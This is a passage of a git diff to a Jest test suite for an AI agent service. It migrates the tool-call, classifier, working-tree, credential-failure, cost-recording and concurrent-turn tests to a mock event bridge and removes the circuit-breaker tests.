@@ -388,19 +598,16 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       );
       expect(endCalls).toHaveLength(1);
       expect(endCalls[0][1].data).toHaveProperty('toolCallId', 'tc-1');
-
-      const textEndCalls = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.TEXT_MESSAGE_END,
-      );
-      expect(textEndCalls).toHaveLength(0);
     });
 
-    it('emits TOOL_CALL_RESULT on tool result message', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'nothing to commit'),
+    it('[P0] emits TOOL_CALL_RESULT on tool result event', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -418,12 +625,14 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(resultCalls[0][1].data).toHaveProperty('content', 'nothing to commit');
     });
 
-    it('preserves error status when TOOL_CALL_RESULT arrives before TOOL_CALL_END (out-of-order)', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeToolResultUserMessage('tc-1', 'command failed', true),
-        makeContentBlockStop(),
+    it('[P0] preserves error status when TOOL_CALL_RESULT isError is true', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'command failed', role: 'tool', isError: true } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -441,13 +650,17 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
     });
   });
 
+  // ─── AC-2: Classifier integration (preserved behavior) ───────────────
+
   describe('[P0] AC-2 — Classifier integration', () => {
-    it('calls classifier on TOOL_CALL_RESULT', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', '1 file changed'),
+    it('[P0] calls classifier on TOOL_CALL_RESULT', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: '1 file changed', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -466,7 +679,7 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       );
     });
 
-    it('emits TOOL_CALL_PROMOTED when classifier returns event', async () => {
+    it('[P0] emits TOOL_CALL_PROMOTED when classifier returns event', async () => {
       mockClassifier.classifyToolResult.mockResolvedValue({
         type: 'TOOL_CALL_PROMOTED',
         toolCallId: 'tc-1',
@@ -476,11 +689,13 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
         viewHref: '/artifacts?id=art-1',
       });
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', '1 file changed'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: '1 file changed', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -498,233 +713,22 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
     });
   });
 
-  describe('[P0] AC-5 — Circuit breaker', () => {
-    it('fires after 120s timeout with no events', async () => {
-      const stalledGenerator = async function* (): AsyncGenerator<SDKMessage, void> {
-        yield* [];
-        await new Promise<never>(jest.fn());
-      };
-
-      mockQuery = jest.fn(() => makeQueryFromGenerator(stalledGenerator()));
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
-
-      agentService = createAgentService();
-      const runTurnPromise = agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      jest.advanceTimersByTime(120_000);
-
-      await runTurnPromise;
-
-      expect(getInterruptMock(mockQuery)).toHaveBeenCalled();
-
-      const errorCalls = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-      expect(errorCalls).toHaveLength(1);
-      expect(errorCalls[0][1].data.message).toBe(
-        'The agent stopped unexpectedly. Send a new message to try again.',
-      );
-    });
-
-    it('resets on each emitted event', async () => {
-      const messages: SDKMessage[] = [
-        makeTextBlockStart(),
-      ];
-
-      // Wrapper ref so TS control-flow analysis on the closure-captured `let`
-      // doesn't narrow it to `never` at the call site below. Direct `let`
-      // assignment inside an async generator's Promise executor is treated as
-      // "may or may not have run" — TS narrows to the post-init type `null`,
-      // and `if (yieldMore)` then narrows to `never`.
-      const yieldMoreRef: { current: (() => void) | null } = { current: null };
-      const slowGenerator = async function* (): AsyncGenerator<SDKMessage, void> {
-        for (const msg of messages) {
-          yield msg;
-        }
-        await new Promise<void>((resolve) => {
-          yieldMoreRef.current = resolve;
-        });
-      };
-
-      mockQuery = jest.fn(() => makeQueryFromGenerator(slowGenerator()));
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
-
-      agentService = createAgentService();
-      const runTurnPromise = agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      jest.advanceTimersByTime(100_000);
-
-      const errorBefore100s = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-      expect(errorBefore100s).toHaveLength(0);
-
-      jest.advanceTimersByTime(30_000);
-
-      const errorAfter130s = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-      expect(errorAfter130s).toHaveLength(1);
-
-      if (yieldMoreRef.current) yieldMoreRef.current();
-      await runTurnPromise;
-    });
-
-    it('calls interrupt() when circuit breaker fires', async () => {
-      const stalledGenerator = async function* (): AsyncGenerator<SDKMessage, void> {
-        yield* [];
-        await new Promise<never>(jest.fn());
-      };
-
-      mockQuery = jest.fn(() => makeQueryFromGenerator(stalledGenerator()));
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
-
-      agentService = createAgentService();
-      const runTurnPromise = agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      jest.advanceTimersByTime(120_000);
-      await runTurnPromise;
-
-      // The circuit breaker cancels the in-process agent run via interrupt()
-      // (alongside abortController.abort()). There is no sandbox-side process to
-      // tear down.
-      const interruptMock = getInterruptMock(mockQuery);
-      expect(interruptMock).toHaveBeenCalled();
-    });
-
-    it('[P1] sync error in interrupt() is caught; RUN_ERROR still emits (fallback path)', async () => {
-      // An outer try/catch around .interrupt() ensures a synchronous throw (e.g.
-      // "interrupt is not a function" if the SDK contract changes) is caught and
-      // logged, and does not prevent the RUN_ERROR emit. This test exercises that
-      // fallback path with an interrupt() that throws synchronously.
-      const customQuery = Object.assign(
-        (async function* (): AsyncGenerator<SDKMessage, void> { yield* []; })(),
-        { interrupt: jest.fn(() => { throw new Error('interrupt is not a function'); }) },
-      ) as unknown as Query;
-      mockQuery = jest.fn(() => customQuery);
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
-
-      agentService = createAgentService();
-      const warnSpy = jest.spyOn(agentService['logger'], 'warn');
-      const runTurnPromise = agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      jest.advanceTimersByTime(120_000);
-      await runTurnPromise.catch(() => undefined);
-
-      // The sync error was caught and logged via the outer catch's logger.warn.
-      expect(warnSpy).toHaveBeenCalledWith(
-        expect.stringContaining('interrupt is not a function'),
-      );
-
-      // RUN_ERROR SSE event was still emitted.
-      const errorCalls = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-      expect(errorCalls).toHaveLength(1);
-    });
-  });
-
-  describe('[P1] AC-5 — Circuit breaker timer cleanup', () => {
-    it('timer cleared on stop()', async () => {
-      const stalledGenerator = async function* (): AsyncGenerator<SDKMessage, void> {
-        yield* [];
-        await new Promise<never>(jest.fn());
-      };
-
-      mockQuery = jest.fn(() => makeQueryFromGenerator(stalledGenerator()));
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
-
-      agentService = createAgentService();
-      const runTurnPromise = agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      await agentService.stop('conv-1');
-
-      const interruptMock = getInterruptMock(mockQuery);
-      expect(interruptMock).toHaveBeenCalled();
-
-      const errorBeforeTimeout = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-
-      jest.advanceTimersByTime(120_000);
-
-      const errorAfterTimeout = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-
-      expect(errorBeforeTimeout).toHaveLength(0);
-      expect(errorAfterTimeout).toHaveLength(0);
-
-      await runTurnPromise.catch(() => undefined);
-    });
-
-    it('timer cleared on normal completion', async () => {
-      setupMockQuery([
-        makeTextBlockStart(),
-        makeTextDeltaEvent('Hello'),
-        makeContentBlockStop(),
-      ]);
-
-      agentService = createAgentService();
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      const errorBefore = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-
-      jest.advanceTimersByTime(120_000);
-
-      const errorAfter = emitSpy.mock.calls.filter(
-        (c) => c[1]?.event === EventType.RUN_ERROR,
-      );
-
-      expect(errorBefore).toHaveLength(0);
-      expect(errorAfter).toHaveLength(0);
-    });
-  });
+  // ─── AC-1: Working tree emission after file-modifying tool calls ──────
 
   describe('[P0] AC-1 — Working tree emission after file-modifying tool calls', () => {
-    it('emits WORKING_TREE_DIRTY after a file-modifying tool call when tree is dirty', async () => {
+    it('[P0] emits WORKING_TREE_DIRTY after a file-modifying tool call when tree is dirty', async () => {
       (sandboxFake.getWorkingTreeStatus as jest.Mock).mockResolvedValue({
         dirty: true,
         files: ['src/foo.ts'],
       });
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Write'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'File written'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -741,17 +745,19 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(dirtyEvents[0][1].data).toEqual({ files: ['src/foo.ts'] });
     });
 
-    it('emits WORKING_TREE_CLEAN after a file-modifying tool call when tree is clean', async () => {
+    it('[P0] emits WORKING_TREE_CLEAN after a file-modifying tool call when tree is clean', async () => {
       (sandboxFake.getWorkingTreeStatus as jest.Mock).mockResolvedValue({
         dirty: false,
         files: [],
       });
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Write'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'File written'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -767,12 +773,14 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(cleanEvents).toHaveLength(1);
     });
 
-    it('does NOT emit working tree events after non-file-modifying tool calls (e.g. Read)', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Read'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'File contents'),
+    it('[P0] does NOT emit working tree events after non-file-modifying tool calls (e.g. Read)', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Read', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File contents', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -792,16 +800,18 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(cleanEvents).toHaveLength(0);
     });
 
-    it('working tree check failure does not crash the agent run (logger.warn, RUN_FINISHED still emits)', async () => {
+    it('[P0] working tree check failure does not crash the agent run (logger.warn, RUN_FINISHED still emits)', async () => {
       (sandboxFake.getWorkingTreeStatus as jest.Mock).mockRejectedValue(
         new Error('git status failed'),
       );
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Write'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'File written'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       const warnSpy = jest.spyOn(agentService['logger'], 'warn');
@@ -828,11 +838,13 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
         files: ['src/foo.ts'],
       });
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Write'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'File written'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -852,18 +864,22 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
     });
   });
 
+  // ─── Story 3.7: CREDENTIAL_FAILURE / ACCESS_DENIED event emission ────
+
   describe('[P0] Story 3.7 — CREDENTIAL_FAILURE / ACCESS_DENIED event emission', () => {
-    it('emits CREDENTIAL_FAILURE on the SSE channel when classifier returns CredentialFailureEvent', async () => {
+    it('[P0] emits CREDENTIAL_FAILURE on the SSE channel when classifier returns CredentialFailureEvent', async () => {
       mockClassifier.classifyToolResult.mockResolvedValue({
         type: 'CREDENTIAL_FAILURE',
         toolCallId: 'tc-1',
       });
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'remote: Invalid username or token.'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'remote: Invalid username or token.', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -877,18 +893,20 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(events).toContain('CREDENTIAL_FAILURE');
     });
 
-    it('emits ACCESS_DENIED on the SSE channel when classifier returns AccessDeniedEvent', async () => {
+    it('[P0] emits ACCESS_DENIED on the SSE channel when classifier returns AccessDeniedEvent', async () => {
       mockClassifier.classifyToolResult.mockResolvedValue({
         type: 'ACCESS_DENIED',
         toolCallId: 'tc-1',
         code: 'RATE_LIMITED',
       });
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'Rate limit exceeded'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'Rate limit exceeded', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -902,17 +920,19 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(events).toContain('ACCESS_DENIED');
     });
 
-    it('CREDENTIAL_FAILURE is emitted before RUN_FINISHED (event ordering)', async () => {
+    it('[P0] CREDENTIAL_FAILURE is emitted before RUN_FINISHED (event ordering)', async () => {
       mockClassifier.classifyToolResult.mockResolvedValue({
         type: 'CREDENTIAL_FAILURE',
         toolCallId: 'tc-1',
       });
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'remote: Invalid username or token.'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'remote: Invalid username or token.', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -931,44 +951,16 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(credentialIndex).toBeLessThan(finishedIndex);
     });
 
-    it('ACCESS_DENIED is emitted before RUN_FINISHED (event ordering)', async () => {
-      mockClassifier.classifyToolResult.mockResolvedValue({
-        type: 'ACCESS_DENIED',
-        toolCallId: 'tc-1',
-        code: 'RATE_LIMITED',
-      });
-
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'Rate limit exceeded'),
-      ]);
-
-      agentService = createAgentService();
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      const events = emitSpy.mock.calls.map((c) => c[1].event);
-      const deniedIndex = events.indexOf('ACCESS_DENIED');
-      const finishedIndex = events.indexOf(EventType.RUN_FINISHED);
-
-      expect(deniedIndex).toBeGreaterThan(-1);
-      expect(finishedIndex).toBeGreaterThan(-1);
-      expect(deniedIndex).toBeLessThan(finishedIndex);
-    });
-
     it('[P1] classifier failure (throws) does not crash the agent run — RUN_FINISHED still emits, logger.error called', async () => {
       mockClassifier.classifyToolResult.mockRejectedValue(new Error('classifier crashed'));
 
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'output'),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'output', role: 'tool', isError: false } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       const errorSpy = jest.spyOn(agentService['logger'], 'error');
@@ -990,14 +982,18 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
     });
   });
 
-  describe('[P0] Story 3.8 AC-1 — cost recording from SDK result message', () => {
-    it('recordCost is called with correct cost data when a result message is in the stream', async () => {
-      setupMockQuery([
-        makeTextBlockStart(),
-        makeTextDeltaEvent('Hello'),
-        makeContentBlockStop(),
-        makeResultMessage(0.42),
+  // ─── Story 3.8: Cost recording from RUN_FINISHED data payload ────────
+
+  describe('[P0] Story 3.8 AC-1 — cost recording from RUN_FINISHED data payload', () => {
+    it('[P0] recordCost is called with correct cost data when RUN_FINISHED carries cost data', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
+        {
+          event: EventType.RUN_FINISHED,
+          data: { total_cost_usd: 0.42, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
+        },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -1017,36 +1013,12 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       });
     });
 
-    it('recordCost is called BEFORE RUN_FINISHED is emitted (event ordering)', async () => {
-      setupMockQuery([
-        makeTextBlockStart(),
-        makeContentBlockStop(),
-        makeResultMessage(0.42),
+    it('[P0] recordCost is NOT called when RUN_FINISHED has no cost data', async () => {
+      const bridge = createMockEventBridge([
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
+        { event: EventType.RUN_FINISHED, data: {} },
       ]);
-
-      agentService = createAgentService();
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      const recordCostCallOrder = mockCostTracking.recordCost.mock.invocationCallOrder[0];
-      const finishedEmitCall = emitSpy.mock.calls.find(
-        (c) => c[1]?.event === EventType.RUN_FINISHED,
-      );
-      expect(finishedEmitCall).toBeDefined();
-      const finishedEmitOrder = emitSpy.mock.invocationCallOrder[
-        emitSpy.mock.calls.indexOf(finishedEmitCall)
-      ];
-      expect(recordCostCallOrder).toBeLessThan(finishedEmitOrder);
-    });
-
-    it('recordCost is NOT called when no result message is in the stream (e.g. circuit breaker fires before result)', async () => {
-      setupMockQuery([
-        makeTextBlockStart(),
-      ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -1059,14 +1031,17 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       expect(mockCostTracking.recordCost).not.toHaveBeenCalled();
     });
 
-    it('recordCost failure does not crash the agent run — RUN_FINISHED still emits', async () => {
+    it('[P0] recordCost failure does not crash the agent run — RUN_FINISHED still emits', async () => {
       mockCostTracking.recordCost.mockRejectedValue(new Error('cost DB write failed'));
 
-      setupMockQuery([
-        makeTextBlockStart(),
-        makeContentBlockStop(),
-        makeResultMessage(0.42),
+      const bridge = createMockEventBridge([
+        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
+        {
+          event: EventType.RUN_FINISHED,
+          data: { total_cost_usd: 0.42, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
+        },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       const loggerErrorSpy = jest.spyOn(agentService['logger'], 'error').mockImplementation(() => undefined);
@@ -1087,38 +1062,17 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       loggerErrorSpy.mockRestore();
     });
 
-    it('cost is recorded from SDKResultError (subtype error_max_turns) as well as SDKResultSuccess', async () => {
-      setupMockQuery([
-        makeTextBlockStart(),
-        makeContentBlockStop(),
-        makeResultMessage(1.5, 'error_max_turns'),
-      ]);
-
-      agentService = createAgentService();
-      await agentService.runTurn({
-        conversationId: 'conv-1',
-        sandboxId: 'sb-1',
-        message: 'test',
-        userId: 'user-1',
-      });
-
-      expect(mockCostTracking.recordCost).toHaveBeenCalledWith({
-        userId: 'user-1',
-        conversationId: 'conv-1',
-        totalCostUsd: 1.5,
-        sessionId: 'sess-1',
-        numTurns: 3,
-        durationMs: 5000,
-      });
-    });
-
     it('[P1] cost is recorded when the result message arrives after tool calls', async () => {
-      setupMockQuery([
-        makeToolUseBlockStart('tc-1', 'Bash'),
-        makeContentBlockStop(),
-        makeToolResultUserMessage('tc-1', 'done'),
-        makeResultMessage(0.77),
+      const bridge = createMockEventBridge([
+        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
+        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
+        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'done', role: 'tool', isError: false } },
+        {
+          event: EventType.RUN_FINISHED,
+          data: { total_cost_usd: 0.77, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
+        },
       ]);
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       await agentService.runTurn({
@@ -1139,17 +1093,15 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
     });
   });
 
-  describe('[P0] Story 3.11 — concurrent-turn guard (AC: 3)', () => {
-    async function* yieldThenHang(messages: SDKMessage[]): AsyncGenerator<SDKMessage, void> {
-      for (const msg of messages) {
-        yield msg;
-      }
-      await new Promise(() => undefined);
-    }
+  // ─── Story 3.11: Concurrent-turn guard ────────────────────────────────
 
+  describe('[P0] Story 3.11 — concurrent-turn guard (AC: 3)', () => {
     it('[P0] second runTurn on an in-flight conversationId is rejected (returns without overwriting)', async () => {
-      mockQuery = jest.fn(() => makeQueryFromGenerator(yieldThenHang([makeContentBlockStop()])));
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
+      const bridge = createMockEventBridge([]);
+      bridge.streamAgentEvents.mockImplementationOnce(
+        async () => new Promise<void>(() => undefined),
+      );
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       const firstRun = agentService.runTurn({
@@ -1158,6 +1110,7 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
         message: 'first',
         userId: 'user-1',
       });
+      firstRun.catch(() => undefined);
       await jest.advanceTimersByTimeAsync(0);
 
       await expect(agentService.runTurn({
@@ -1168,14 +1121,14 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       })).resolves.toBeUndefined();
 
       expect(agentService.isIdle('conv-1')).toBe(false);
-
-      await jest.advanceTimersByTimeAsync(120_000);
-      await firstRun.catch(() => undefined);
     });
 
     it('[P0] the rejected second turn does NOT emit RUN_STARTED or RUN_ERROR', async () => {
-      mockQuery = jest.fn(() => makeQueryFromGenerator(yieldThenHang([makeContentBlockStop()])));
-      jest.doMock('@anthropic-ai/claude-agent-sdk', () => ({ query: mockQuery }));
+      const bridge = createMockEventBridge([]);
+      bridge.streamAgentEvents.mockImplementationOnce(
+        async () => new Promise<void>(() => undefined),
+      );
+      mockEventBridge = bridge;
 
       agentService = createAgentService();
       const firstRun = agentService.runTurn({
@@ -1184,6 +1137,7 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
         message: 'first',
         userId: 'user-1',
       });
+      firstRun.catch(() => undefined);
       await jest.advanceTimersByTimeAsync(0);
 
       emitSpy.mockClear();
@@ -1197,148 +1151,23 @@ describe('AgentService (real — tool call lifecycle + circuit breaker)', () => 
       const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
       expect(emittedEvents).not.toContain(EventType.RUN_STARTED);
       expect(emittedEvents).not.toContain(EventType.RUN_ERROR);
-
-      await jest.advanceTimersByTimeAsync(120_000);
-      await firstRun.catch(() => undefined);
-    });
-
-    it('[P0] the rejected second turn does NOT overwrite circuitBreakerTimers', async () => {
